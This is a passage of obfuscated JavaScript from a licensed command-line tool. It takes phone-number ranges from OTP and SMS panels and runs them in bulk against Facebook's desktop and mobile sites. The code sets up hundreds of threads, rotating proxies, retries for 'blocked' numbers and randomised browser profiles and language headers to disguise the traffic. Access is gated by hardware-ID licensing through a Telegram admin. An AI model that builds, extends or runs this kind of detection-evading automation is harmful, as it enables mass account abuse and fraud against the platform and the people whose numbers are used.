            console.error(R(`\n[!] AUTHORIZATION REQUIRED`));
            console.error(W(`Your HWID: `) + B(v1495));
            console.error(R(`This HWID is not registered in the database.`));
            console.error(C(`Redirecting to Admin's Telegram inbox...\n`));
            setTimeout(() => {
              try {
                const sys_platform = require('os').platform();
                if (sys_platform === "win32") {
                  require('child_process').execSync('start https://t.me/Samol_Hasan');
                } else if (sys_platform === "darwin") {
                  require('child_process').execSync('open https://t.me/Samol_Hasan');
                } else {
                  require('child_process').execSync('xdg-open https://t.me/Samol_Hasan');
                }
              } catch (e) { }
              process.exit(1);
            }, 2000);
            return;
          }
          const expiry_timestamp = parseInt(hwidMatch[1]);
          const current_time = Math.floor(Date.now() / 1000);
          if (expiry_timestamp < 100000) {
            console.error(R(`\n[!] LICENSE FORMAT ERROR`));
            console.error(R(`The license format has been updated for security. Please ask the admin to re-add your HWID.\n`));
            process.exit(1);
          }
          if (current_time > expiry_timestamp) {
            console.error(R(`\n[!] LICENSE EXPIRED`));
            console.error(W(`Your HWID: `) + B(v1495));
            console.error(R(`Your license has expired. Please contact admin.\n`));
            process.exit(1);
          }
          resolve();
        });
      }).on('error', (e) => {
        console.error(R(`\n[!] Failed to connect to Auth Server. Error: ${e.message}\n`));
        process.exit(1);
      });
    });
    console.log("   [32m[✓] License valid — Welcome! [0m");
    global.CURRENT_USER = "Licensed";
    global.SYNC_STATUS = "up to date";
    return true;
  } catch (e) {
    console.error(R("\n  ✗ License verification failed. Exiting.\n"));
    process.exit(1);
  }
}
async function selectOption(v1636, v1637) {
  return new Promise(v1638 => {
    let v1639 = 0x0;
    process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn24 = () => {
      process.stdout.write("[2J[H");
      printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("👑 " + v1636) + '\x0a');
      v1637.forEach((v1640, v1641) => {
        v1641 === v1639 ? console.log("   " + chalk.hex("#00F0FF").bold('➔') + '\x20\x20' + chalk.hex("#00FF88").bold(v1640.name)) : console.log("      " + chalk.hex("#888888")(v1640.name));
      }), console.log('');
    };
    fn24();
    const fn25 = (v1642, v1643) => {
      v1643.ctrl && v1643.name === 'c' && process.exit(0x0);
      if (v1643.name === 'up') v1639 = (v1639 - 0x1 + v1637.length) % v1637.length, fn24();else {
        if (v1643.name === "down") v1639 = (v1639 + 0x1) % v1637.length, fn24();else {
          if (v1643.name === "return") {
            if (process.stdin.isTTY) process.stdin.setRawMode(false);
            process.stdin.removeListener("keypress", fn25), v1638(v1637[v1639].value);
          }
        }
      }
    };
    process.stdin.on("keypress", fn25);
  });
}
async function promptText(v1644, v1645) {
  return new Promise(v1646 => {
    process.stdout.write('\x20\x20' + FB_CYAN('➔') + '\x20' + FB_GOLD(v1644) + '\x20');
    let v1647 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn26 = v1648 => {
      const v1649 = v1648.toString();
      if (v1649.includes('\x0a') || v1649.includes('\x0d')) {
        process.stdin.removeListener("data", fn26), v1647 += v1649.split(/[\r\n]/)[0x0];
        let v1650 = v1647.trim();
        if (v1650.startsWith('\x22') && v1650.endsWith('\x22')) v1650 = v1650.slice(0x1, -1);else v1650.startsWith('\x27') && v1650.endsWith('\x27') && (v1650 = v1650.slice(0x1, -1));
        v1646(v1650 || v1645);
      } else v1647 += v1649;
    };
    process.stdin.on("data", fn26);
  });
}
async function pickNumbersSource() {
  let v1651 = isTermuxEnv ? "/sdcard/Download/numbers.txt" : "numbers.txt";
  while (true) {
    process.stdout.write("[2J[H"), printHeader();
    {
      const v1652 = {};
      v1652.name = isTermuxEnv ? "📁 Auto Load from Termux Download" : "📁 Auto Load from Current Folder", v1652.value = "file_default";
      const v1652_1 = {};
      v1652_1.name = "📂 Custom File Path", v1652_1.value = "custom";
      const v1653 = {};
      v1653.name = "🌐 Auto fetch from NexaOTP Panel", v1653.value = "nexa";
      const v1654 = {};
      v1654.name = "⚡ Auto fetch from Voltx (2oo9)", v1654.value = "voltx";
      const v1655 = {};
      v1655.name = "🔥 Auto fetch from Stex (2oo9)", v1655.value = "stex";
      const v1656 = {};
      v1656.name = "📱 Auto fetch from SMS Bower", v1656.value = "smsbower";
      const v1657 = {};
      v1657.name = "⚡ Auto fetch from Zenex", v1657.value = "zenex";
      const v1658 = {};
      v1658.name = "⬅️ Go Back to Mode Selection", v1658.value = "back";
      const v1659 = await selectOption("SELECT NUMBER SOURCE", [v1652, v1652_1, v1653, v1654, v1655, v1656, v1657, v1658]),
        v1660 = {};
      v1660.back = true;
      if (v1659 === "back") return v1660;
      if (v1659 === "voltx" || v1659 === "stex") {
        const v1663 = v1659 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
          v1664 = v1659 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
          v1665 = v1659 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
          v1666 = v1659 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
        let v1667 = '',
          v1668 = [],
          v1669 = 0x32,
          v1670 = 0x1;
        while (v1670 <= 0x3) {
          process.stdout.write("[2J[H"), printHeader();
          if (v1670 === 0x1) {
            if (fs.existsSync(v1664)) {
              v1667 = fs.readFileSync(v1664, "utf8").trim();
              const v1673 = {};
              v1673.name = "Use saved key", v1673.value = "use";
              const v1674 = {};
              v1674.name = "Enter new key", v1674.value = "new";
              const v1675 = {};
              v1675.name = "Remove saved key", v1675.value = "remove";
              const v1676 = {};
              v1676.name = "⬅️ Back", v1676.value = "back";
              const v1677 = await selectOption(v1663 + " key (" + v1667.substring(0x0, 0xa) + "...)", [v1673, v1674, v1675, v1676]);
              if (v1677 === "back") {
                v1670 = 0x0;
                break;
              }
              if (v1677 === "remove") fs.existsSync(v1664) && fs.unlinkSync(v1664), v1667 = '';else v1677 === "new" && (v1667 = '');
            }
            if (!v1667) {
              v1667 = await promptText("Enter " + v1663 + " API Key (mauthapi):", '');
              if (v1667.toLowerCase() === "back") {
                v1670 = 0x0;
                break;
              }
              const v1678 = {};
              v1678.name = "Yes", v1678.value = "yes";
              const v1679 = {};
              v1679.name = 'No', v1679.value = 'no';
              const v1680 = await selectOption("Save key?", [v1678, v1679]);
              if (v1680 === "yes" && v1667) fs.writeFileSync(v1664, v1667, "utf8");
            }
            if (v1667) v1670 = 0x2;
          } else {
            if (v1670 === 0x2) {
              const v1681 = {};
              v1681.name = "🔍 Auto Range Finder (scan console)", v1681.value = "auto";
              const v1682 = {};
              v1682.name = "✏️  Enter manually", v1682.value = "manual";
              const v1683 = {};
              v1683.name = "⬅️ Back", v1683.value = "back";
              const v1684 = await selectOption("How to select ranges?", [v1681, v1682, v1683]);
              if (v1684 === "back") {
                v1670 = 0x1;
                continue;
              }
              if (v1684 === "auto") {
                const v1685 = await autoRangeFinderFor2Oo(v1667, v1666, selectOption, promptText);
                v1685 && v1685.length > 0x0 && (v1668 = v1685, v1670 = 0x3);
              } else {
                v1668 = [];
                let v1686 = true;
                while (v1686) {
                  const v1687 = await promptText("Enter range #" + (v1668.length + 0x1) + " (e.g. 26134XXX) or 'back':", '');
                  if (v1687.toLowerCase() === "back") {
                    if (v1668.length === 0x0) break;else {
                      v1668.pop();
                      continue;
                    }
                  }
                  if (v1687) v1668.push(v1687);
                  const v1688 = {};
                  v1688.name = 'No', v1688.value = 'no';
                  const v1689 = await selectOption("Added " + v1668.length + ". Add another?", [{
                    'name': "Yes",
                    'value': "yes"
                  }, v1688]);
                  if (v1689 === 'no') v1686 = false;
                }
                if (v1668.length > 0x0) v1670 = 0x3;
              }
            } else {
              if (v1670 === 0x3) {
                const v1690 = await promptText("How many numbers? [default:50]:", '50');
                if (v1690.toLowerCase() === "back") {
                  v1670 = 0x2;
                  continue;
                }
                v1669 = parseInt(v1690) || 0x32, v1670 = 0x4;
              }
            }
          }
        }
        if (v1670 === 0x0) continue;
        const v1671 = {};
        v1671.provider = v1659, v1671.apiKey = v1667, v1671.getPath = v1665, v1671.consolePath = v1666, v1671.ranges = v1668, v1671.totalCount = v1669;
        const v1672 = {};
        return v1672.numbersFile = "numbers.txt", v1672.nexaConfig = null, v1672.smsBowerConfig = null, v1672.zenexConfig = null, v1672.twoOoConfig = v1671, v1672;
      } else {
        if (v1659 === "nexa") {
          let v1691 = '';
          const v1692 = path.join(__dirname, ".nexa_api_key");
          if (fs.existsSync(v1692)) {
            const v1704 = fs.readFileSync(v1692, "utf8").trim(),
              v1705 = {};
            v1705.name = "Yes, use saved key", v1705.value = "yes";
            const v1706 = {};
            v1706.name = "No, enter new key", v1706.value = 'no';
            const v1707 = {};
            v1707.name = "Delete saved key", v1707.value = "delete";
            const v1708 = {};
            v1708.name = "⬅️ Go Back", v1708.value = "back";
            const v1709 = await selectOption("Found saved API Key (..." + v1704.slice(-4) + "). Use it?", [v1705, v1706, v1707, v1708]);
            if (v1709 === "back") continue;
            if (v1709 === "yes") v1691 = v1704;else v1709 === "delete" && (fs.unlinkSync(v1692), console.log(G("\n   ✗ Saved key deleted.\n")));
          }
          if (!v1691) {
            v1691 = await promptText("Enter NexaOTP API Key (or type 'back'):", '');
            if (v1691.toLowerCase() === "back") continue;
            const v1710 = {};
            v1710.name = 'No', v1710.value = 'no';
            const v1711 = await selectOption("Save this key for future use?", [{
              'name': "Yes, save it",
              'value': "yes"
            }, v1710]);
            v1711 === "yes" && (fs.writeFileSync(v1692, v1691, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
          }
          let v1693 = [],
            v1694 = true,
            v1695 = false;
          while (v1694) {
            const v1712 = await promptText("Enter range #" + (v1693.length + 0x1) + " (e.g. 21624485XXX) [or type 'back']:", '');
            if (v1712.toLowerCase() === "back") {
              v1695 = true;
              break;
            }
            if (v1712) v1693.push(v1712);
            const v1713 = {};
            v1713.name = "Yes", v1713.value = "yes";
            const v1714 = {};
            v1714.name = "No, proceed", v1714.value = 'no';
            const v1715 = await selectOption("Add another range?", [v1713, v1714]);
            if (v1715 === 'no') v1694 = false;
          }
          if (v1695) continue;
          const v1696 = await promptText("How many numbers to process? (default: 50):", '50');
          if (v1696.toLowerCase() === "back") continue;
          const v1697 = parseInt(v1696) || 0x32,
            v1698 = {};
          v1698.name = "Server 1 (/get)", v1698.value = "/api/v1/numbers/get";
          const v1699 = {};
          v1699.name = "Server 2 (/p2/get)", v1699.value = "/api/v1/numbers/p2/get";
          const v1700 = {};
          v1700.name = "Server 3 (/p3/get)", v1700.value = "/api/v1/numbers/p3/get";
          const v1701 = await selectOption("SELECT NEXA SERVER", [v1698, v1699, v1700, {
            'name': "⬅️ Go Back",
            'value': "back"
          }]);
          if (v1701 === "back") continue;
          const v1702 = {};
          v1702.apiKey = v1691, v1702.ranges = v1693, v1702.totalCount = v1697, v1702.serverEndpoint = v1701;
          const v1703 = {};
          return v1703.numbersFile = "numbers.txt", v1703.nexaConfig = v1702, v1703.twoOoConfig = null, v1703.smsBowerConfig = null, v1703.zenexConfig = null, v1703;
        } else {
          if (v1659 === "smsbower") {
            let v1716 = '',
              v1717 = 'fb',
              v1718 = '0',
              v1719 = "0.5",
              v1720 = 0x32,
              v1721 = 0x1;
            while (v1721 <= 0x4) {
              process.stdout.write("[2J[H"), printHeader();
              if (v1721 === 0x1) {
                if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                  v1716 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                  const v1724 = {};
                  v1724.name = "Enter new key", v1724.value = "new";
                  const v1725 = {};
                  v1725.name = "⬅️ Back", v1725.value = "back";
                  const v1726 = await selectOption("SMS Bower key found (" + v1716.substring(0x0, 0xa) + "...)", [{
                    'name': "Use saved key",
                    'value': "use"
                  }, v1724, {
                    'name': "Remove saved key",
                    'value': "remove"
                  }, v1725]);
                  if (v1726 === "back") {
                    v1721 = 0x0;
                    break;
                  }
                  if (v1726 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v1716 = '';else {
                    if (v1726 === "new") v1716 = '';
                  }
                }
                if (!v1716) {
                  v1716 = await promptText("Enter SMS Bower API Key:", '');
                  if (v1716.toLowerCase() === "back") {
                    v1721 = 0x0;
                    break;
                  }
                  const v1727 = {};
                  v1727.name = "Yes", v1727.value = "yes";
                  const v1728 = {};
                  v1728.name = 'No', v1728.value = 'no';
                  const v1729 = await selectOption("Save key?", [v1727, v1728]);
                  if (v1729 === "yes" && v1716) fs.writeFileSync(SMSBOWER_KEY_FILE, v1716, "utf8");
                }
                if (v1716) v1721 = 0x2;
              } else {
                if (v1721 === 0x2) {
                  v1717 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                  if (v1717.toLowerCase() === "back") {
                    v1721 = 0x1;
                    continue;
                  }
                  v1717 = v1717 || 'fb', v1721 = 0x3;
                } else {
                  if (v1721 === 0x3) {
                    v1718 = await promptText("Country code (0 = any) [default: 0]:", '0');
                    if (v1718.toLowerCase() === "back") {
                      v1721 = 0x2;
                      continue;
                    }
                    v1718 = v1718 || '0';
                    const v1730 = await promptText("Max price per number [default: 0.5]:", "0.5");
                    v1719 = v1730 || "0.5", v1721 = 0x4;
                  } else {
                    if (v1721 === 0x4) {
                      const v1731 = await promptText("How many numbers? [default: 50]:", '50');
                      if (v1731.toLowerCase() === "back") {
                        v1721 = 0x3;
                        continue;
                      }
                      v1720 = parseInt(v1731) || 0x32, v1721 = 0x5;
                    }
                  }
                }
              }
            }
            if (v1721 === 0x0) continue;
            const v1722 = {};
            v1722.apiKey = v1716, v1722.service = v1717, v1722.country = v1718, v1722.maxPrice = v1719, v1722.totalCount = v1720;
            const v1723 = {};
            return v1723.numbersFile = "numbers.txt", v1723.nexaConfig = null, v1723.twoOoConfig = null, v1723.zenexConfig = null, v1723.smsBowerConfig = v1722, v1723;
          } else {
            if (v1659 === "zenex") {
              let v1732 = '',
                v1733 = [],
                v1734 = 0x32,
                v1735 = 0x1;
              while (v1735 <= 0x3) {
                process.stdout.write("[2J[H"), printHeader();
                if (v1735 === 0x1) {
                  if (fs.existsSync(ZENEX_KEY_FILE)) {
                    v1732 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                    const v1738 = {};
                    v1738.name = "Use saved key", v1738.value = "use";
                    const v1739 = {};
                    v1739.name = "Enter new key", v1739.value = "new";
                    const v1740 = {};
                    v1740.name = "Remove saved key", v1740.value = "remove";
                    const v1741 = {};
                    v1741.name = "⬅️ Back", v1741.value = "back";
                    const v1742 = await selectOption("Zenex key found (" + v1732.substring(0x0, 0xa) + "...)", [v1738, v1739, v1740, v1741]);
                    if (v1742 === "back") {
                      v1735 = 0x0;
                      break;
                    }
                    if (v1742 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v1732 = '';else {
                      if (v1742 === "new") v1732 = '';
                    }
                  }
                  if (!v1732) {
                    v1732 = await promptText("Enter Zenex API Key (mapikey):", '');
                    if (v1732.toLowerCase() === "back") {
                      v1735 = 0x0;
                      break;
                    }
                    const v1743 = {};
                    v1743.name = "Yes", v1743.value = "yes";
                    const v1744 = {};
                    v1744.name = 'No', v1744.value = 'no';
                    const v1745 = await selectOption("Save key?", [v1743, v1744]);
                    if (v1745 === "yes" && v1732) fs.writeFileSync(ZENEX_KEY_FILE, v1732, "utf8");
                  }
                  if (v1732) v1735 = 0x2;
                } else {
                  if (v1735 === 0x2) {
                    v1733 = [];
                    let v1746 = true;
                    while (v1746) {
                      const v1747 = await promptText("Enter range #" + (v1733.length + 0x1) + " (e.g. 4473845XXX) or 'back':", '');
                      if (v1747.toLowerCase() === "back") {
                        if (v1733.length === 0x0) {
                          v1735 = 0x1;
                          break;
                        } else {
                          v1733.pop();
                          continue;
                        }
                      }
                      if (v1747) v1733.push(v1747);
                      const v1748 = {};
                      v1748.name = "Yes", v1748.value = "yes";
                      const v1749 = {};
                      v1749.name = 'No', v1749.value = 'no';
                      const v1750 = await selectOption("Added " + v1733.length + ". Add another?", [v1748, v1749]);
                      if (v1750 === 'no') v1746 = false;
                    }
                    if (v1733.length > 0x0) v1735 = 0x3;
                  } else {
                    if (v1735 === 0x3) {
                      const v1751 = await promptText("How many numbers? [default: 50]:", '50');
                      if (v1751.toLowerCase() === "back") {
                        v1735 = 0x2;
                        continue;
                      }
                      v1734 = parseInt(v1751) || 0x32, v1735 = 0x4;
                    }
                  }
                }
              }
              if (v1735 === 0x0) continue;
              const v1736 = {};
              v1736.apiKey = v1732, v1736.ranges = v1733, v1736.totalCount = v1734;
              const v1737 = {};
              return v1737.numbersFile = "numbers.txt", v1737.nexaConfig = null, v1737.twoOoConfig = null, v1737.smsBowerConfig = null, v1737.zenexConfig = v1736, v1737;
            } else {
              if (v1659 === "file_default") {
                v1651 = isTermuxEnv ? "/sdcard/Download/numbers.txt" : "numbers.txt";
              } else if (v1659 === "custom") {
                const v1752 = await promptText("Enter Numbers File Path (or type 'back'):", isTermuxEnv ? "/sdcard/Download/numbers.txt" : "numbers.txt");
                if (v1752.toLowerCase() === "back") continue;
                v1651 = v1752;
              } else v1651 = v1659;
            }
          }
        }
      }
      const v1661 = path.resolve(v1651);
      if (!fs.existsSync(v1661)) fs.writeFileSync(v1661, '');
      const v1662 = {};
      return v1662.numbersFile = v1651, v1662.nexaConfig = null, v1662.twoOoConfig = null, v1662.smsBowerConfig = null, v1662.zenexConfig = null, v1662;
    }
  }
}
async function selectRetryCount() {
  const v1753 = {};
  v1753.name = "0 Retries (No Retry - Fast)", v1753.value = 0x0;
  const v1754 = {};
  v1754.name = "1 Retry (Rotate Proxy Once)";
  v1754.value = 0x1;
  const v1755 = {};
  v1755.name = "2 Retries", v1755.value = 0x2;
  const v1756 = {};
  v1756.name = "3 Retries (Default)";
  v1756.value = 0x3;
  const v1757 = {};
  v1757.name = "5 Retries (Maximum)", v1757.value = 0x5;
  const v1758 = {};
  v1758.name = "⬅️ Go Back to Proxy Selection";
  v1758.value = "back";
  const v1759 = [v1753, v1754, v1755, v1756, v1757, v1758];
  return await selectOption("SELECT MAX RETRIES FOR BLOCKED/REJECTED NUMBERS", v1759);
}
let SKIP_PROXY_CHECK = false;
async function selectThreadCount() {
  const v1760 = {};
  v1760.name = "15 Threads";
  v1760.value = 0xf;
  const v1761 = {};
  v1761.name = "30 Threads", v1761.value = 0x1e;
  const v1762 = {};
  v1762.name = "50 Threads (Default)", v1762.value = 0x32;
  const v1763 = {};
  v1763.name = "100 Threads (Fast)", v1763.value = 0x64;
  const v1764 = {};
  v1764.name = "200 Threads (Extreme)", v1764.value = 0xc8;
  const v1765 = {};
  v1765.name = "✏️  Custom Threads (enter manually)", v1765.value = "custom";
  const v1766 = {};
  v1766.name = "⬅️ Go Back to Numbers Selection", v1766.value = "back";
  const v1767 = await selectOption("SELECT THREADS", [v1760, v1761, v1762, v1763, v1764, v1765, v1766]);
  if (v1767 === "back") return "back";
  if (v1767 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1768 = await promptText("Enter custom thread count (1-500) [or type 'back']:", '50');
    if (v1768.toLowerCase() === "back") return "back";
    return Math.max(0x1, Math.min(0x1f4, parseInt(v1768) || 0x32));
  }
  return v1767;
}
async function selectProxyCheckOption() {
  if (!proxyManager.hasProxies) return true;
  const v1769 = {};
  v1769.name = "⬅️ Go Back to Proxy Selection", v1769.value = "back";
  const v1770 = await selectOption("PROXY CONNECTIVITY CHECK", [{
    'name': "🔍 Check Proxies First (Test & Exclude Dead)",
    'value': "check"
  }, {
    'name': "⚡ Start Immediately (Skip Proxy Check)",
    'value': "skip"
  }, v1769]);
  if (v1770 === "back") return "back";
  SKIP_PROXY_CHECK = v1770 === "skip";
  return v1770;
}
async function selectFacebookUrl() {
  const v1771 = {};
  v1771.name = "🎲 Random Rotate (Recommended)", v1771.value = "random";
  const v1772 = {};
  v1772.name = "🖥  Desktop (www.facebook.com)", v1772.value = "www.facebook.com";
  const v1773 = {};
  v1773.name = "📱 Mobile (m.facebook.com) ", v1773.value = "m.facebook.com";
  const v1774 = {};
  v1774.name = "⬅️ Go Back to Threads Selection";
  v1774.value = "back";
  const v1775 = [v1771, v1772, v1773, v1774];
  return await selectOption("SELECT DEVICE", v1775);
}
let SELECTED_ACCEPT_LANG = 'en';
function getLanguageHeader(v1776) {
  if (!v1776 || v1776 === 'en') return "en-US,en;q=0.9";
  if (v1776 === "auto") {
    const v1777 = ["en-US,en;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "pt-BR,pt;q=0.9", "ar-SA,ar;q=0.9", "it-IT,it;q=0.9", "tr-TR,tr;q=0.9", "id-ID,id;q=0.9", "hi-IN,hi;q=0.9", "vi-VN,vi;q=0.9", "th-TH,th;q=0.9", "ru-RU,ru;q=0.9", "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "zh-CN,zh;q=0.9"];
    return v1777[Math.floor(Math.random() * v1777.length)];
  }
  return v1776;
}
async function selectAcceptLanguage() {
  const v1778 = {};
  v1778.name = "🌍 Auto Language (Randomly choose from 194 countries)", v1778.value = "auto";
  const v1779 = {};
  v1779.name = "🇬🇧 Default (en-US,en;q=0.9)";
  v1779.value = 'en';
  const v1780 = {};
  v1780.name = "🇪🇸 Spanish (es-ES,es;q=0.9)", v1780.value = "es-ES,es;q=0.9";
  const v1781 = {};
  v1781.name = "🇫🇷 French (fr-FR,fr;q=0.9)", v1781.value = "fr-FR,fr;q=0.9";
  const v1782 = {};
  v1782.name = "🇩🇪 German (de-DE,de;q=0.9)", v1782.value = "de-DE,de;q=0.9";
  const v1783 = {};
  v1783.name = "🇧🇷 Portuguese (pt-BR,pt;q=0.9)", v1783.value = "pt-BR,pt;q=0.9";
  const v1784 = {};
  v1784.name = "🇸🇦 Arabic (ar-SA,ar;q=0.9)", v1784.value = "ar-SA,ar;q=0.9";
  const v1785 = {};
  v1785.name = "🇮🇹 Italian (it-IT,it;q=0.9)", v1785.value = "it-IT,it;q=0.9";
  const v1786 = {};
  v1786.name = "🇹🇷 Turkish (tr-TR,tr;q=0.9)", v1786.value = "tr-TR,tr;q=0.9";
  const v1787 = {};
  v1787.name = "✏️ Custom Input", v1787.value = "custom";
  const v1788 = {};
  v1788.name = "⬅️ Go Back to Domain Selection", v1788.value = "back";
  const v1789 = [v1778, v1779, v1780, v1781, v1782, v1783, v1784, v1785, v1786, v1787, v1788];
  let v1790 = await selectOption("SELECT ACCEPT-LANGUAGE", v1789);
  if (v1790 === "back") return "back";
  return v1790 === "custom" && (v1790 = await promptText("Enter custom Accept-Language (e.g. id-ID,id;q=0.9) [or 'back']:", "en-US,en;q=0.9")), v1790;
}
async function selectBrowserProfile() {
  const v1791 = {};
  v1791.name = "🎲 Random Mix  (All Browser & OS Types)";
  v1791.value = "random";
  const v1792 = {};
  v1792.name = "🐧 Linux OS (Chrome + Firefox + Brave + Edge on Linux)", v1792.value = "linux";
  const v1793 = {};
  v1793.name = "🧭 Apple Safari (macOS + iOS + FBAN In-App)", v1793.value = "safari";
  const v1794 = {};
  v1794.name = "🍎 Apple iOS (Safari + Chrome on iPhone/iPad)", v1794.value = "ios";
  const v1795 = {};
  v1795.name = "🌐 Google Chrome (Desktop Windows)", v1795.value = "chrome";
  const v1796 = {};
  v1796.name = "🦊 Mozilla Firefox (Desktop Windows)", v1796.value = "firefox";
  const v1797 = {};
  v1797.name = "🌊 Microsoft Edge (Desktop Windows)", v1797.value = "edge";
  const v1798 = {};
  v1798.name = "🦆 DuckDuckGo (Windows Desktop - duck.txt API)", v1798.value = "duckduckgo";
  const v1799 = {};
  v1799.name = "🏄 Opera (Desktop)", v1799.value = "opera";
  const v1800 = {};
  v1800.name = "🦁 Brave (Desktop)", v1800.value = "brave";
  const v1801 = {};
  v1801.name = "🎻 Vivaldi (Desktop)", v1801.value = "vivaldi";
  const v1802 = {};
  v1802.name = "⬅️ Go Back to Language Selection", v1802.value = "back";
  const v1803 = [v1791, v1792, v1793, v1794, v1795, v1796, v1797, v1798, v1799, v1800, v1801, v1802];
  return new Promise(v1804 => {
    let v1805 = 0x0,
      v1806 = '',
      v1807 = '';
    process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn27 = v1808 => {
        const v1809 = (v1808 || '').trim();
        if (!v1809) return [];
        if (v1809 === '0' || v1809.toLowerCase() === "back") return [0x0];
        if (v1809.toLowerCase() === "all") {
          const v1812 = {};
          return v1812.length = 0xb, Array.from(v1812, (v1813, v1814) => v1814 + 0x1);
        }
        const v1810 = v1809.split(/[\s,]+/);
        const v1811 = [];
        for (const v1815 of v1810) {
          if (!v1815) continue;
          if (v1815.includes('-')) {
            const [v1816, v1817] = v1815.split('-'),
              v1818 = parseInt(v1816, 0xa),
              v1819 = parseInt(v1817, 0xa);
            if (!isNaN(v1818) && !isNaN(v1819)) {
              const v1820 = Math.min(v1818, v1819),
                v1821 = Math.max(v1818, v1819);
              for (let v1822 = v1820; v1822 <= v1821; v1822++) {
                if (v1822 >= 0x0 && v1822 <= 0xb && !v1811.includes(v1822)) v1811.push(v1822);
              }
            }
          } else {
            const v1823 = parseInt(v1815, 0xa);
            if (!isNaN(v1823) && v1823 >= 0x0 && v1823 <= 0xb && !v1811.includes(v1823)) v1811.push(v1823);
          }
        }
        return v1811;
      },
      fn28 = () => {
        process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("👑 SELECT BROWSER PROFILE") + '\x0a');
        v1803.forEach((v1824, v1825) => {
          const v1826 = v1824.value === "back" ? "[0]" : '[' + (v1825 + 0x1) + ']';
          const v1827 = v1826.padEnd(0x5);
          v1825 === v1805 ? console.log("   " + chalk.hex("#00F0FF").bold('➔') + '\x20\x20' + chalk.hex("#FFD700").bold(v1827) + '\x20' + chalk.hex("#00FF88").bold(v1824.name)) : console.log("       " + chalk.hex("#888888")(v1827) + '\x20' + chalk.hex("#CCCCCC")(v1824.name));
        }), console.log(''), v1807 && console.log("   " + chalk.hex("#FF4444").bold('✗\x20' + v1807) + '\x0a'), process.stdout.write("   " + chalk.hex("#00F0FF").bold('➔') + '\x20' + chalk.hex("#FCAF45").bold("Select [e.g. 1 3 5 / 5 8 or ↑/↓]:") + '\x20' + chalk.hex("#FFFFFF").bold(v1806) + chalk.hex("#00F0FF")('█') + '\x20');
      };
    fn28();
    const fn29 = () => {
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.removeListener("keypress", fn30);
    };
    const fn30 = async (v1828, v1829) => {
      if (!v1829) return;
      v1829.ctrl && v1829.name === 'c' && (fn29(), process.exit(0x0));
      if (v1829.name === 'up') {
        v1805 = (v1805 - 0x1 + v1803.length) % v1803.length, v1807 = '', fn28();
        return;
      }
      if (v1829.name === "down") {
        v1805 = (v1805 + 0x1) % v1803.length, v1807 = '', fn28();
        return;
      }
      if (v1829.name === "backspace") {
        v1806.length > 0x0 && (v1806 = v1806.slice(0x0, -1), v1807 = '', fn28());
        return;
      }
      if (v1829.name === "escape") {
        v1806 = '', v1807 = '', fn28();
        return;
      }
      if (v1829.name === "return" || v1829.name === "enter") {
        const v1831 = v1806.trim();
        if (v1831.length > 0x0) {
          const v1832 = fn27(v1831);
          if (v1832.includes(0x0)) {
            fn29(), v1804("back");
            return;
          }
          if (v1832.length === 0x0) {
            v1807 = "Invalid input \"" + v1831 + "\". Enter numbers 1 to 11 (e.g. 1 3 5 or 5 8), or 0 to go back.", fn28();
            return;
          }
          const v1833 = [],
            v1834 = [];
          for (const v1835 of v1832) {
            const v1836 = v1803[v1835 - 0x1];
            v1836 && v1836.value !== "back" && !v1833.includes(v1836.value) && (v1833.push(v1836.value), v1834.push(v1836.name.replace(/^[^\w\s]+/, '').split('(')[0x0].trim()));
          }
          if (v1833.length === 0x0) {
            v1807 = "No valid browsers found in selection.", fn28();
            return;
          }
          fn29();
          v1833.length === 0x1 ? (console.log("\n\n   " + chalk.hex("#00FF88").bold("✓ Selected Browser:") + '\x20' + chalk.hex("#00F0FF").bold(v1834[0x0]) + '\x0a'), await sleep(0x1f4), v1804(v1833[0x0])) : (console.log("\n\n   " + chalk.hex("#00FF88").bold("✓ Multi-Browser Active:") + '\x20' + chalk.hex("#00F0FF").bold(v1834.join(" + ")) + '\x0a'), await sleep(0x2bc), v1804(v1833));
          return;
        } else {
          const v1837 = v1803[v1805].value;
          fn29();
          if (v1837 !== "back") {
            const v1838 = v1803[v1805].name.replace(/^[^\w\s]+/, '').split('(')[0x0].trim();
            console.log("\n\n   " + chalk.hex("#00FF88").bold("✓ Selected Browser:") + '\x20' + chalk.hex("#00F0FF").bold(v1838) + '\x0a'), await sleep(0x190);
          }
          v1804(v1837);
          return;
        }
      }
      const v1830 = v1829.sequence || '';
      v1830 && /^[\d\s,\-a-zA-Z]$/.test(v1830) && (v1806 += v1830, v1807 = '', fn28());
    };
    process.stdin.on("keypress", fn30);
  });
}
async function selectProxySetup() {
  const v1839 = {};
  v1839.name = "🔌 Direct Connection (No Proxy)", v1839.value = "none";
  const v1840 = {};
  v1840.name = "🔗 Single Proxy String", v1840.value = "single";
  const v1841 = {};
  v1841.name = "⬅️ Go Back to Browser Selection", v1841.value = "back";
  const v1842 = await selectOption("SELECT PROXY", [{
    'name': isTermuxEnv ? "📁 Auto Load from Termux Download" : "📁 Auto Load from Current Folder",
    'value': "file_default"
  }, {
    'name': "📂 Custom Proxy File Path",
    'value': "file_custom"
  }, v1839, v1840, v1841]);
  if (v1842 === "back") return "back";
